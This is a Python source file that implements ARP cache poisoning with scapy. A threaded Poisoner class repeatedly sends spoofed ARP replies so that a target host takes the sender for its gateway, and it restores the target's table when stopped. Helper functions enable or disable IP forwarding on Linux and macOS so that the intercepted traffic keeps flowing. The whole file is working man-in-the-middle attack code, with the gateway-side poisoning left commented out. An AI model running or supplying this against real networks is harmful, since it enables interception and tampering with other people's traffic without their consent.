import os
import platform
from subprocess import check_output, run, DEVNULL
from threading import Thread, Event

from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sendp


class Poisoner:
    """
    This is a wrapper for a Python Thread which will run every sleep_time seconds ARP poisoning a victim. Calling the
    stop method will stop (almost) immediately the Thread restoring the ARP table of the victim. If the commented
    fragments were removed, a duplex attack would be performed, but this is usually blocked by modern routers, so it
    is disabled by default.
    """
    def __init__(self, gateway_ip: str, gateway_mac: str, target_ip: str, target_mac: str, sleep_time: float = 1):
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.sleep_time = sleep_time

        self.__event = Event()
        self.__thread = Thread(target=self.__poison, daemon=True)
        self.__thread.start()

    def __poison(self):
        while not self.__event.is_set():
            # Make the victim think we are the gateway
            sendp(Ether(dst=self.target_mac) / ARP(op="is-at",
                                                   pdst=self.target_ip,
                                                   hwdst=self.target_mac,
                                                   psrc=self.gateway_ip), verbose=False)
            """
            # Make the gateway think we are the victim
            sendp(Ether(dst=self.gateway_mac) / ARP(op="is-at",
                                                    pdst=self.gateway_ip,
                                                    hwdst=self.gateway_mac,
                                                    psrc=self.target_ip), verbose=False)
            """

            self.__event.wait(self.sleep_time)

        # Make the victim think the gateway is actually the gateway
        sendp(Ether(dst=self.target_mac) / ARP(op="is-at",
                                               pdst=self.target_ip,
                                               hwdst=self.target_mac,
                                               psrc=self.gateway_ip,
                                               hwsrc=self.gateway_mac), count=5, verbose=False)
        """
        # Make the gateway think the victim is actually the victim
        sendp(Ether(dst=self.gateway_mac) / ARP(op="is-at",
                                                    pdst=self.gateway_ip,
                                                    hwdst=self.gateway_mac,
                                                    psrc=self.target_ip,
                                                    hwsrc=self.target_mac), count=5, verbose=False)
        """

    def stop(self):
        self.__event.set()

    def stop_and_join(self):
        self.stop()
        self.__thread.join(self.sleep_time)


__linux_filename = "/proc/sys/net/ipv4/ip_forward"


def is_ip_forwarding_enabled() -> bool:
    if platform.system() == "Linux":
        with open(__linux_filename, "r") as f:
            return f.read().strip() == '1'
    elif platform.system() == "Darwin":
        output = check_output(("sysctl", "net.inet.ip.forwarding"))
        return output.split()[-1].decode() == '1'

    return False


def __change_ip_forwarding(value: int):
    if platform.system() == "Linux":
        with open(os.open(__linux_filename, os.O_WRONLY, 0o644), "w") as f:
            f.write(f"{value}\n")
    elif platform.system() == "Darwin":
        run(("sysctl", "-w", f"net.inet.ip.forwarding={value}"), stdout=DEVNULL)


def enable_ip_forwarding():
    __change_ip_forwarding(1)


def disable_ip_forwarding():
    __change_ip_forwarding(0)
